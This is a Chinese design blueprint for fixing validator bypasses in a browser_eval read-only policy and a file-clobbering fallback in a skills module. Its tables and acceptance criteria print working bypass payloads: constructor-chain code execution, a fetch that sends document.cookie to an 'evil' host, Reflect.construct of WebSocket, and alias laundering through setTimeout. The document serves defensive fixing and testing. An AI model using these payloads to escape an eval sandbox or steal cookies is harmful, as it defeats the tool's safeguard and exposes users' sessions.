# beta.11 P1 缺陷修复 设计蓝图（v1）

> 状态：**已拍板**（决策来源 `DECIDED.md`，2026-09-08 用户经 ask_user_question 确认）
> 日期：2026-09-08
> 工作仓库：`/mnt/md0/junhua_work/picoaide-harness`，分支 `fix/eval-policy-p1-bypasses`，基线 HEAD `b624840e62`
> 版本沿革：v1 = 当前权威（首版；规划期已用可执行原型验证，见 §5.3）
> 需求来源：`REQUEST.md`；审计来源：`docs/AUDIT-BETA11-CHANGES-2026-09-08.md`

---

## 0. 执行摘要

- **目标**：修复 beta.11 审计发现的 3 个 P1 缺陷，且**不得过度修复**（beta.11 的"允许网络外发"产品决策与合法只读访问必须保留）。
- **一句话结论**：P1-1/P1-2 的根因是同一处——`eval-policy.ts` 的 AST 校验**只对调用/成员链的最外层一层判名**；修复方式是把"成员链全段 + 调用目标名"统一收敂为一张**属性名黑名单**并递归解析 base 链，再加**箭头函数形参别名**判定。P1-3 的根因是 fallback 里一句 `rmSync(to)`；删除它即恢复 pre-fix 的 merge 语义。
- **规划期已验证**：按本设计写成的原型（`/tmp/evalproto5`）在**完整对抗矩阵 52 例 0 失败**、**现有 168 个 browser 测试全绿**、**新增对抗 spec 在修复前失败 7 例 / 修复后 16 例全过**、**故障注入 4 码（EBUSY/EPERM/EACCES/EXDEV）修复前 4 失败 / 修复后 4 通过**。设计不是纸面推演。

---

## 1. 术语表

| 术语（内部） | 定义 | UI 文案 |
|---|---|---|
| `validateEvalExpression` | `browser_eval` 的 host 侧表达式校验入口；解析为单个 Expression 后走 `findViolation` | 不出现（内部） |
| `findViolation` | AST 遍历器，返回**第一个**违规原因字符串或 `null` | 不出现 |
| 成员链 / base 链 | `a.b.c` 中 `object` 指针串起来的一整串 `MemberExpression`；`c` 是最外层 property | 不出现 |
| `memberName(node)` | 解析单个 `MemberExpression` 的 property 名；点号取 Identifier 名，字符串字面量计算取 value，**非字面量计算返回 `undefined`** | 不出现 |
| `callTargetName(callee)` | 解析调用目标名；Identifier/MemberExpression 返回名字，箭头 IIFE 返回 `null`（自包含），其余返回 `undefined`（动态→拒绝） | 不出现 |
| 危险属性名黑名单 `DANGEROUS_MEMBERS` | 链上任一环节命中即拒绝的属性名集合（constructor/prototype/__proto__/eval/Function/call/apply/bind/construct/反射读取 API） | 不出现 |
| 别名洗白（alias laundering） | `(f => f('code'))(setTimeout)` —— 把危险函数经箭头形参中转，使调用点只剩一个普通名字 | 不出现 |
| `WRITE_APIS` | 既有写/副作用 API 名集合（`eval-policy.ts:50-118`），命中即拒（调用或成员访问） | 不出现 |
| merge 语义 | `cpSync(from, to)` 覆盖同名文件、**保留目标目录其它文件**，不清空目标 | 不出现 |
| clobber | 先 `rmSync(to)` 再复制，导致目标目录原有用户文件被删除 | 不出现 |
| 降级路径（fallback） | `renameSync` 抛 EXDEV/EBUSY/EPERM/EACCES/ENOTEMPTY 时改走 copy+delete | 不出现 |
| 故障注入 | 强制让 `renameSync` 抛指定 errno 以进入降级路径的测试手段 | 不出现 |

---

## 2. 现状核实

### 2.1 代码位置与命中

| 现状 | 代码位置 | 命中什么 | 结论 |
|---|---|---|---|
| CallExpression 只判 callee 单名 | `eval-policy.ts:163-172` | `callTargetName(callee)` 返回名字后仅比对 `WRITE_APIS`/`eval`/`Function`；`constructor` 不在集合 | **增量**：补黑名单 + 别名判定 |
| MemberExpression 只看最外层 property | `eval-policy.ts:173-180` | `memberName(current)` 只取最外层；`('').constructor.constructor` 最外层是 `constructor`→不在 `WRITE_APIS`→放行 | **增量**：递归 base 链 |
| `callTargetName` 不递归 base | `eval-policy.ts:214-228` | MemberExpression 分支直接 `memberName(node)`（同样只看最外层） | **语义核验 + 边界补强** |
| `memberName` 只看最后一层 | `eval-policy.ts:234-249` | 非字面量计算返回 `undefined`（放行）；字符串字面量返回 value | **保留**（`data[key]` 合法读依赖此语义） |
| `WRITE_APIS` 移除网络类 | `eval-policy.ts:40-118` | WebSocket/XMLHttpRequest/EventSource 不在集合 → 成员值访问放行 → `Reflect.construct` 可构造 | **保留移除**（产品决策），靠 `Reflect.construct` 拒止 |
| `Reflect.construct` 从未被禁 | `eval-policy.ts` 全文无 `Reflect` 条目 | P1-2 净新增 | **增量** |
| `new` 已被禁 | `eval-policy.ts:152` | `NewExpression` 拒绝 | ✅ 已实现，无需动 |
| fallback 内 `rmSync(to)` | `skills.js:191` | 目标无 SKILL.md 时无条件清空目标目录 | **重写该行**（删除） |
| SKILL.md 预检 | `skills.js:161-167`（rename 前）+ `188-190`（fallback 内） | 已有真实技能时拒绝 | ✅ 已实现，**保留** |
| 降级码表 | `skills.js:178-183` | 只含 EXDEV/EBUSY/EPERM/EACCES | **增量**：补 ENOTEMPTY（见 D5） |
| 现有"EBUSY"测试 | `skills.test.js:336-356` | 只造**空 stub 目录**——POSIX 上 rename 直接成功，**fallback 从未执行**（审计 P2-1 假阳性） | **补强**：新增故障注入测试 |

### 2.2 实测复现（规划期亲测，非转述）

| 缺陷 | 复现方式 | 实测结果 |
|---|---|---|
| P1-1 | `probe/probe-eval.mjs` 直接 import 真实验证器 | **5/5 变体 ACCEPT**；`node` 执行确认 `(x=>x).constructor('return 1').call(null)` → `1` |
| P1-2 | 同上 | **2/2 ACCEPT**；`new WebSocket()` 仍 REJECT（只堵了直接 new） |
| P1-3 | `probe/probe-p13.mjs` + `/tmp/enotempty-check.mjs` | 真实 `EXDEV`（tmpfs→ext4）**无需 mock** 即触发 clobber：`notes.md` + `sub/keep.txt` 被删除；同设备非空目标裸抛 `ENOTEMPTY` |
| 测试基线 | `vitest run` / `node --test tests/skills.test.js tests/api.test.js` | browser **168 passed**；memory-evolve skills+api **34 passed** |

---

## 3. 拍板决策摘要

| # | 决策点 | 拍板结果 | 状态 | 对架构的影响 |
|---|---|---|---|---|
| D1 | 修复范围 | 3 个 P1 全修（P1-1/P1-2/P1-3）；P2 项本轮不修 | **已拍板**（DECIDED 决策 1） | 2 个包、4 个文件 |
| D2 | eval 修复策略 | 拒绝 `constructor`/`prototype`/`__proto__` 链 + `Reflect.construct`/`apply`/`call`/`bind` | **已拍板**（DECIDED 决策 2） | `findViolation` 递归 base 链 |
| D3 | 网络外发决策 | 保留：`fetch`/`sendBeacon`/`postMessage` 仍放行 | **已拍板**（DECIDED 决策 2） | 不往 `WRITE_APIS` 加回网络类 |
| D4 | memory-evolve 策略 | merge 语义：删 `rmSync(to)`，`cpSync` 覆盖同名、保留其它；保留 SKILL.md 预检与降级可用 | **已拍板**（DECIDED 决策 3） | 删 `skills.js:191` 一行 |
| D5 | 是否补 `ENOTEMPTY` 进降级码表 | **补**。理由：同设备非空目标（无 SKILL.md）目前裸抛异常给前端（`api.js:783-788` 转成"采纳失败"），与"降级可用"目标冲突；补后走 merge 分支且不丢数据（原型实测：`ENOTEMPTY` 从裸抛 → `ok:true` 且 `notes.md` 保留） | **agent 定案** | `skills.js:178-183` 加一项 |
| D6 | 黑名单是"属性名制"还是"基对象制" | **属性名制（base-agnostic）**。理由：`Reflect.get(obj,'constructor')` 拿到的值与 `obj.constructor` 同源，按基对象判（只认 `Reflect`）会被别名绕过；属性名制天然覆盖 | **agent 定案** | 单一集合 `DANGEROUS_MEMBERS` |
| D7 | 是否禁 `getPrototypeOf`/`getOwnPropertyDescriptor` | **`getOwnPropertyDescriptor(s)` 禁**（`.value` 可直接取到 `Function`，实测可执行）；**`getPrototypeOf` 不禁**（其结果上的 `.constructor` 已被链式黑名单拦截，禁它属过度修复） | **agent 定案** | 黑名单精确到必要项 |
| D8 | 是否禁箭头形参别名调用 | **禁**（`(f => f('alert(1)'))(setTimeout)` 实测洗白成功）。与既有 `window[key]('x')` 的 deny-by-default 同源 | **agent 定案** | 新增形参预扫描 |
| D9 | 故障注入实现方式 | **子进程 + loader hook 替换 `node:fs`**（唯一能覆盖 4 个 errno 的手段，见 §4.4） | **agent 定案** | 新增 `tests/fixtures/` |
| D10 | 文档归类 | 遵循仓库既有约定：设计/实施蓝图归 `docs/planning/`，拍板摘要归 `docs/decisions/`，审计报告归 `docs/AUDIT-*.md` | **agent 定案** | 见 §6 |

> **待拍板项：无**。所有决策点均已拍板或有 agent 定案，编码可直接开始。

---

## 4. 设计

### 4.1 P1-1/P1-2 统一根因与统一解法

**根因一句话**：校验器把"名字"当作**单个节点**的属性，而不是**整条取值路径**的属性。

- 调用：`('').constructor.constructor('return 1')` 的 callee 是 `MemberExpression`，`memberName` 返回最外层 `'constructor'`，不在 `WRITE_APIS` → 放行。
- 取值：`Reflect.construct(window['WebSocket'], [...])` 的 callee 是 `Reflect.construct`，`memberName` 返回 `'construct'`，不在任何名单 → 放行。

**统一解法**：把判定下沉为「**属性名黑名单 + 递归整条链**」。

```ts
const DANGEROUS_MEMBERS = new Set([
  // P1-1：构造函数链代码执行
  'constructor', 'prototype', '__proto__',
  // 可执行原语作为成员值
  'eval', 'Function',
  // P1-2 / 反射入口（属性名制：不依赖基对象是谁，故别名不可绕过）
  'call', 'apply', 'bind', 'construct',
  'getOwnPropertyDescriptor', 'getOwnPropertyDescriptors',
  '__lookupGetter__', '__lookupSetter__',
])
```

**成员链递归判定**（替换 `eval-policy.ts:173-180` 的 MemberExpression 分支）：

```ts
if (type === 'MemberExpression') {
  // 递归整条 base 链：每个环节的 property 名都要判，不能只看最外层
  let link: AnyNode | undefined = current
  while (link !== undefined && link.type === 'MemberExpression') {
    const linkName = memberName(link)
    if (linkName === undefined) break            // 非字面量计算读：不可证明 → 放行（data[key]）
    if (linkName !== null && DANGEROUS_MEMBERS.has(linkName)) {
      return `access to ${linkName} is not allowed (read-only eval)`
    }
    link = (link as { object?: AnyNode }).object
    if (link !== undefined && link.type === 'ChainExpression') {   // 可选链
      link = (link as unknown as { expression?: AnyNode }).expression
    }
  }
  const name = memberName(current)
  if (name === undefined) {
    // 非字面量计算 READ 允许（data[key]）
  } else if (name !== null && WRITE_APIS.has(name)) {
    return `access to ${name} is not allowed (read-only eval)`
  }
}
```

**调用目标判定**（在 `eval-policy.ts:163-172` 的 CallExpression 分支内、既有 `WRITE_APIS` 判定**之前**插入）：

```ts
if (name !== null && DANGEROUS_MEMBERS.has(name)) {
  return `call to ${name} is not allowed (read-only eval)`
}
if (name !== null && arrowParams.has(name)) {
  return `call to alias ${name} is not allowed (read-only eval)`
}
```

**箭头形参别名预扫描**（`findViolation` 开头，主遍历之前）：

```ts
const arrowParams = new Set<string>()
{ // 收集全部 ArrowFunctionExpression 的 Identifier 形参名
  // （declaration 类节点已被禁，箭头形参是唯一剩余的绑定形式）
  // 遍历规则与主循环一致：跳过 type/start/end/loc/raw/range
}
```

> 注意：`call/apply/bind/construct` 等同时进 `DANGEROUS_MEMBERS`，因此**成员访问**（`fetch.call`、`Reflect.construct`）与**调用**（`fetch.call(...)`、`x.constructor.apply(...)`）两条路径都被覆盖，无需第二张表。

### 4.2 逐条回答需求方提出的设计问题

**Q1：AST 判定如何递归解析 base 链？**
从最外层 `MemberExpression` 出发，沿 `.object` 指针逐层下溯，直到 `object` 不再是 `MemberExpression`（Identifier/Literal/CallExpression/ArrayExpression/…）。每层用 `memberName` 取 property 名并比对黑名单。遇到 `ChainExpression`（可选链）时先解包 `.expression` 再继续。

**Q2：哪些属性名加入黑名单？**
`constructor` / `prototype` / `__proto__`（P1-1 核心，DECIDED 决策 2 明列）；另加 `eval` / `Function`（可执行原语）、`call` / `apply` / `bind` / `construct`（P1-2 与调用跳板）、`getOwnPropertyDescriptor` / `getOwnPropertyDescriptors` / `__lookupGetter__` / `__lookupSetter__`（反射取值直达 `Function`）。

**Q3：可选链怎么处理？**
两层处理：(a) 链递归里 `object` 若是 `ChainExpression` 则解包；(b) 整个表达式本身是 `ChainExpression` 时，`findViolation` 的通用子节点遍历会进入 `.expression`，其中每个 `MemberExpression` 各自走同一套递归——`('')['constructor']?.['constructor'](...)` 因此在第一个环节就被拒（实测：`access to constructor`）。`callTargetName` 已有 ChainExpression 解包（`eval-policy.ts:217-219`），无需改动。

**Q4：`Reflect`/`call`/`apply`/`bind` 怎么判定？**
**不按基对象判定**（D6）。`Reflect.construct` 之所以能被拒，是因为 `memberName` 返回 `'construct'` 而 `'construct'` 在黑名单里——这对 `Reflect.construct`、`Reflect['construct']`、`Reflect?.construct` 以及任何其它对象的 `.construct` 一致生效。同理 `.call/.apply/.bind` 作为**调用目标**在 CallExpression 分支被拒，作为**成员访问**在 MemberExpression 分支被拒。

**Q5：是否存在"修复后仍可绕过"的残余路径？**

| 残余路径 | 本设计下的判定 | 说明 |
|---|---|---|
| `Object.getPrototypeOf(Function).constructor(...)` | **拒绝** | `Identifier 'Function'` 已被 `eval-policy.ts:181-185` 拒；且 `.constructor` 命中链式黑名单。双重拒绝 |
| `Object.getPrototypeOf(obj).constructor(...)` | **拒绝** | `.constructor` 命中链式黑名单（**不需要**把 `getPrototypeOf` 本身加入黑名单，见 D7） |
| `Object.getOwnPropertyDescriptor(fn,'constructor').value(...)` | **拒绝** | `getOwnPropertyDescriptor` 命中黑名单 |
| `Reflect.get(obj,'constructor')(...)` | **拒绝** | `Reflect.get(...)` 返回值上直接调用 → callee 是 CallExpression → `callTargetName` 返回 `undefined` → "dynamic call target" 拒绝 |
| `(f => f('code'))(setTimeout)` | **拒绝** | 箭头形参别名判定 |
| `''['con'+'structor'](...)` | **拒绝** | 非字面量计算 → `callTargetName` 返回 `undefined` → 动态调用目标拒绝（既有行为，实测确认） |
| `Object.prototype.toString` | **拒绝** | `.prototype` 命中黑名单（属可接受代价：纯读 `Object.prototype.x` 被禁，见 §4.5） |
| `({}).constructor` 纯读 | **拒绝** | DECIDED 决策 2 明列拒绝；`AC3` 的合法读清单**不含**它 |
| 原型污染类读取 `obj.__proto__` | **拒绝** | 命中黑名单 |
| `new Function(...)` / `new` 任意构造 | **拒绝** | 既有 `NewExpression` 规则（`eval-policy.ts:152`） |

**结论**：本设计下 P1-1/P1-2 的已知变体与上述残余路径**全部拒绝**，且 52 例对抗矩阵 0 失败（§5.3 实测）。

**Q6：为什么"不能证明即拒绝"不会失控？**
因为判定只针对**属性名**这一静态可判的有限集合，不做数据流分析。合法读（`window.__NEXT_DATA__`、`data[key]`、`readText('#a')`、`localStorage.getItem('t')`）与合法网络调用（`fetch`/`sendBeacon`/`postMessage`）的属性名均不在黑名单，且 `fetch(...)`/`.then(r => r.text())` 的调用目标名合法、形参调用不在箭头形参集合内——实测 26 例合法集 0 误伤。

### 4.3 P1-3 设计

**改动**：删除 `skills.js:191` 的 `rmSync(to, { recursive: true, force: true })`，保留 `cpSync(from, to, { recursive: true })`。

**语义**：
- `cpSync(from, to, {recursive:true})` 在 `to` 已存在目录时为**merge**：覆盖同名文件、保留其它文件（原型实测：`notes.md` + `sub/keep.txt` 均保留，`SKILL.md` 落地）。
- `skills.js:161-163`（源 SKILL.md 预检）与 `skills.js:165-167` + `188-190`（目标 SKILL.md 预检）**全部保留** → 真实技能不会被覆盖，返回值仍是 `{ok:false, message: alreadyInLib}`。
- 空 stub 目录场景（Windows EBUSY 的原始动机）：`to` 为空目录，`cpSync` 正常落地 → 采纳仍成功。

**边界场景与失败模式**：

| 场景 | 修复后行为 |
|---|---|
| `to` 不存在 | `cpSync` 创建，采纳成功 |
| `to` 为空目录 | merge 到空目录 = 等同移动，采纳成功（保留原 EBUSY 动机） |
| `to` 含用户文件、无 SKILL.md | **文件全部保留**，SKILL.md 落地，采纳成功 |
| `to` 含 SKILL.md | 预检拒绝（未改动） |
| `renameSync` 抛 EXDEV/EBUSY/EPERM/EACCES/ENOTEMPTY | 走 merge 降级，成功 |
| `renameSync` 抛其它码 | 原样 rethrow（未改动） |
| `cpSync` 本身失败 | 抛异常 → `api.js:786-788` 转成"采纳失败（code）"（未改动） |

### 4.4 故障注入怎么实现（回答需求方的关键问题）

**结论：`node:test` 里 monkey-patch 不可行，采用"子进程 + loader hook 替换 `node:fs`"。**

规划期实测三条路线：

| 方案 | 实测结果 | 采用 |
|---|---|---|
| A. 在测试进程内改 `require('node:fs').renameSync` | ❌ **无效**。`skills.js:28` 是 ESM 具名导入（`import { renameSync } from 'node:fs'`），绑定在模块实例化时固定，改 CJS 对象属性不影响它。实测注入 EBUSY 后仍抛 `ENOTEMPTY`（说明打到了真实 `renameSync`） | 否 |
| B. `mock.module('node:fs', ...)`（需 `--experimental-test-module-mocks`） | ❌ **两种写法都失败**。全量 `namedExports` → `TypeError: Cannot redefine property: constants`；部分 `namedExports` → `SyntaxError: Named export 'cpSync' not found`（builtin CJS 互操作）；`defaultExport` → 具名导出变 `undefined` | 否 |
| C. **子进程 + `--import` loader hook**，把 `node:fs` 解析成一个只改 `renameSync` 的 shim | ✅ **4/4 errno 全部命中降级路径**，且能区分修复前（4 fail）/修复后（4 pass） | **采用** |

**实现要点**：
- `tests/fixtures/fs-fault-hook.mjs`：`resolve()` 把 `'node:fs'` 指向虚拟模块 `node-fs-fault:shim`；`load()` 生成源码，从 `globalThis.__realFs` 取真实 fs，仅把 `renameSync` 换成抛 `process.env.FAULT_CODE` 的函数，其余具名导出原样转发。
- `tests/fixtures/register.mjs`：`register('./fs-fault-hook.mjs', import.meta.url)`。
- `tests/fixtures/child-approve.mjs`：先 `globalThis.__realFs = require('node:fs')`（拿真实 fs），再 import 目标 `skills.js`（由 `SKILLS_MODULE` 环境变量指向），构造 fixture 后输出 JSON 断言面。
- `tests/skills-fault.test.js`：`spawnSync(process.execPath, ['--import', register, child], { env: { FAULT_CODE, SKILLS_MODULE } })`，对 EBUSY/EPERM/EACCES/EXDEV 各断言 `notesSurvived === true` 且 `skillLanded === true`。
- 另有一条**无需 mock** 的真实 EXDEV 用例（pending 放 `/dev/shm`、skills 放 `/tmp`）作为端到端补证；CI 无 `/dev/shm` 时 skip。

> 实测证据：修复前 4/4 fail（`notes:false`），修复后 4/4 pass（`notes:true, contents:['SKILL.md','notes.md']`）。

### 4.5 已知取舍（防过度修复的边界声明）

| 取舍 | 说明 |
|---|---|
| `({}).constructor` 纯读被拒 | DECIDED 决策 2 明列；属"可接受代价"，不进 AC3 合法集 |
| `obj.__proto__` 纯读被拒 | 同上（`__proto__` 明列） |
| `Object.prototype.toString` 被拒 | 连带代价：`.prototype` 在黑名单 |
| `Object.getOwnPropertyDescriptor({}, 'x')` 被拒 | 连带代价：该 API 整体禁用（`.value` 可直达 `Function`） |
| `(x => x.constructor)('')` 被拒 | 链式黑名单在箭头体内同样生效（正确行为） |
| **不**禁 `Object.getPrototypeOf` | 其结果上的 `.constructor` 已拦截，禁它属过度修复（D7） |
| **不**往 `WRITE_APIS` 加回网络类 | beta.11 产品决策（D3） |
| **不**禁所有成员链 | `data[key]`、`window.__NEXT_DATA__`、`a.b.c` 合法读全部保留 |

#### 4.5.1 属性名复用连带拒绝清单（D-2，2026-09-09 修复轮 3 实测）

黑名单是**属性名制**（D6），因此凡是**复用**了黑名单属性名的惯用法都会被一并拒绝——这是"按名拦截"的必然代价，不是缺陷，但必须显式登记，避免被后续轮次当成回归来"修"。以下 9 类惯用法**全部被拒**（本表由 `validateEvalExpression` 实测生成，非推演）：

| # | 被连带拒绝的惯用法 | 实际拒绝原因 | 替代写法 / 代价 |
|---|---|---|---|
| 1 | `Object.prototype.hasOwnProperty.call({}, 'x')` | `call` 在黑名单（调用蹦床） | 用 `Object.hasOwn(o,'x')` |
| 2 | `Array.prototype.slice.call([1,2])` | 同上 | 直接 `[1,2].slice()` |
| 3 | `''.constructor.name` | `constructor` 在黑名单（构造链） | eval 内无法取类型名 |
| 4 | `[].constructor` / `[1,2].constructor` | 同上 | 同上 |
| 5 | `fn.apply(null, [1])` / `fn.bind(null)` | `apply`/`bind` 在黑名单（调用蹦床） | 直接 `fn(1)` |
| 6 | `Object.getOwnPropertyDescriptor({}, 'x')` | 该 API 整体禁用（`.value` 可直达 `Function`，D7） | eval 内无法读属性描述符 |
| 7 | `x?.constructor` | `constructor` 在黑名单，可选链不豁免 | 同上 |
| 8 | `Object.prototype.toString.call({})`、`Object.prototype.hasOwnProperty` | `prototype` + `call` 双双命中 | 无法用 `Object.prototype.*` |
| 9 | `({}).__proto__` | `__proto__` 在黑名单 | 用 `Object.getPrototypeOf({})`（**允许**） |

**未受影响（仍然放行）**：`Object.keys({})`、`Array.isArray([])`、`Object.getPrototypeOf({})`、`JSON.parse('{}')`、`[1,2].slice(1)`、`Object.freeze({})`、`x instanceof Object`、`typeof x`、`data[key]`、`window['__NEXT'+'_DATA__']`。

> **回归判定口径**：以上 9 类若在后续修复中变成 ACCEPT，说明黑名单被削弱，属**安全回归**需重新评估；只要仍被拒，就是设计内取舍。反向守护见 `tests/eval-policy-p1-bypass.spec.ts` 的 AC3c/AC3d 合法集。

---

## 5. 验证计划

### 5.1 验证环境

- browser：`cd packages/host/browser && ./node_modules/.bin/vitest run`（node 环境，10 个 spec）
- memory-evolve：`cd packages/vendor/memory-evolve && node --test tests/skills.test.js tests/api.test.js`（**注意**：全量 776 测试有 43 个预存环境失败，与本次无关）
- 门禁：`corepack yarn check`（或至少 `yarn workspace @picoaide/dsh-browser check` + memory-evolve 两文件测试）
- 规划期原型：`/tmp/evalproto5`（eval 修复原型）、`/tmp/meproto2`（memory-evolve 修复原型）、`/tmp/faulttest`（故障注入测试原型）

### 5.2 基线（修复前，已实测）

| 项 | 基线 |
|---|---|
| browser 全量 | 168 passed / 10 files |
| memory-evolve skills+api | 34 passed |
| 新增对抗 spec | **7 failed / 9 passed**（证明测试有效，AC5） |
| 新增故障注入 spec | **4 failed / 0 passed**（证明测试有效，AC6） |

### 5.3 规划期原型实测（设计可行性证据）

| 验证 | 结果 |
|---|---|
| 对抗矩阵 52 例（26 拒 + 26 接受） | **0 失败** |
| 现有 168 个 browser 测试 | **168 passed** |
| 新增对抗 spec（16 例） | 修复前 7 failed → 修复后 **16 passed** |
| 故障注入 4 码 | 修复前 4 failed → 修复后 **4 passed** |
| memory-evolve 现有 34 测试 | **34 passed** |
| 真实 EXDEV（无 mock） | 修复前 clobber（`notes:false`）→ 修复后保留（`notes:true`） |
| ENOTEMPTY 扩展 | 修复前裸抛 → 修复后 `ok:true` 且 `notes.md` 保留，34 测试仍全绿 |

### 5.4 验收标准（AC1..AC7，逐条可判定）

| AC | 判定标准（可执行、可打勾） | 验证命令 / 证据 | 责任人 |
|---|---|---|---|
| **AC1** | `validateEvalExpression` 对以下 **5 个 P1-1 变体全部抛 `BrowserError`（code=`eval-policy`）**：① `(x=>x).constructor('return 1').call(null)` ② `('')['constructor']?.['constructor']('return 1').call(null)` ③ `Reflect.construct(('').constructor, ['return 1'])` ④ `('').constructor.constructor('return document.cookie').call(null)` ⑤ `('').constructor.constructor('return fetch("https://evil/?d="+document.cookie)').call(null)` | `vitest run tests/eval-policy.spec.ts -t "P1-1"` 全绿；且该 spec 在基线代码上失败 | coder + auditor |
| **AC2** | `Reflect.construct(window['WebSocket'], ['wss://evil'])` 与 `Reflect.construct(window['XMLHttpRequest'], [])` 均抛 `eval-policy` | `vitest run tests/eval-policy.spec.ts -t "P1-2"` 全绿；基线失败 | coder + auditor |
| **AC3** | 合法集 **26 例全部不抛**：`fetch('https://example.com')`、`fetch('https://example.com', {method:'POST',body:'x'})`、`navigator.sendBeacon(...)`、`window.postMessage('x','*')`、`fetch(...).then(r=>r.text())`、`fetch('...?c='+document.cookie)`、`1 + 1`、`window.__NEXT_DATA__`、`readText('#a')`、`localStorage.getItem('t')`、`data[key]`、`window['__NEXT_DATA__']`、`window?.__NEXT_DATA__`、`[1,2,3].map(n=>n*2)`、`JSON.parse('{}')`、`'abc'.toUpperCase()`、`document.querySelector('#a').textContent`、`window.location.href`、`performance.now()`、`Date.now()`、`Math.max(1,2)`、`(x=>x*2)(21)`、`Reflect.has(window,'WebSocket')`、`Reflect.ownKeys({})`、`Object.getPrototypeOf({})`、`fetch('u').then(r=>r.headers.get('x'))` | `vitest run tests/eval-policy.spec.ts -t "AC3"` 全绿 | coder + auditor |
| **AC4** | ① `cpSync` merge：目标目录含 `notes.md`+`sub/keep.txt` 且无 SKILL.md 时，采纳返回 `ok:true` 且**两个文件仍存在**、`SKILL.md` 落地；② EBUSY/EPERM/EACCES/EXDEV 四码降级**均返回 `ok:true`**；③ 目标含 SKILL.md 时仍返回 `ok:false` 且原 SKILL.md 内容不变 | `node --test tests/skills.test.js tests/skills-fault.test.js` 全绿 | coder + auditor |
| **AC5** | 新增对抗矩阵 spec 覆盖 constructor 链 / 可选链 / `Reflect.construct` / `getPrototypeOf` / `getOwnPropertyDescriptor` / 字符串载荷 / `call` / `apply` / `bind` / 箭头别名 / 计算属性混淆，**≥16 条**；且**在修复前代码上必须失败**（实测基线 7 failed） | 把新 spec 拷到 `git stash` 后的基线跑一次 → 必须 ≥1 failed；修复后全绿 | auditor 复跑 |
| **AC6** | 故障注入 spec 对 EBUSY/EPERM/EACCES/EXDEV 四码各断言"目标既有内容不变"（`notesSurvived===true` 且 `skillLanded===true`），**4/4 在修复前失败、修复后通过** | `node --test tests/skills-fault.test.js`；基线对照跑一次 | auditor 复跑 |
| **AC7** | 全量回归：browser **≥168 passed / 0 failed**；memory-evolve `skills.test.js`+`api.test.js` **34 passed / 0 failed**；`corepack yarn check` 通过 | `vitest run`；`node --test tests/skills.test.js tests/api.test.js`；`corepack yarn check` | coder + auditor |

**AC 判定口径**：
- "抛 `eval-policy`" = 抛 `BrowserError` 且 `.code === 'eval-policy'`（复用 `eval-policy.spec.ts:14-23` 的 `expectEvalPolicyError` 断言）。
- "不抛" = `expect(() => validateEvalExpression(expr)).not.toThrow()`。
- 每条 AC 的测试断言必须**在测试名里带 AC 编号或 P1 编号**，便于审计逐条 grep。

---

## 6. 文档归类

| 产物 | 位置 | 依据 |
|---|---|---|
| 本设计蓝图 | `docs/planning/2026-09-08-beta11-p1-bypass-fix-design.md` | 仓库既有 `docs/planning/` 约定 |
| 实施计划 | `docs/planning/2026-09-08-beta11-p1-bypass-fix-implementation.md` | 同上 |
| 拍板摘要 | `docs/decisions/2026-09-08-beta11-p1-bypass-fix.md` | 仓库既有 `docs/decisions/` 约定 |
| 修复后审计报告 | `docs/AUDIT-P1-BYPASS-FIX-<date>.md` | `REQUEST.md` 约定 `docs/AUDIT-<topic>-<date>.md` |
| 黑板副本（本流水线） | `PLAN.md` / `IMPLEMENTATION.md`（黑板目录） | 流水线约定 |

> 规划期只读业务代码，**未修改仓库任何文件**；原型全部落在 `/tmp/` 与黑板 `probe/`。
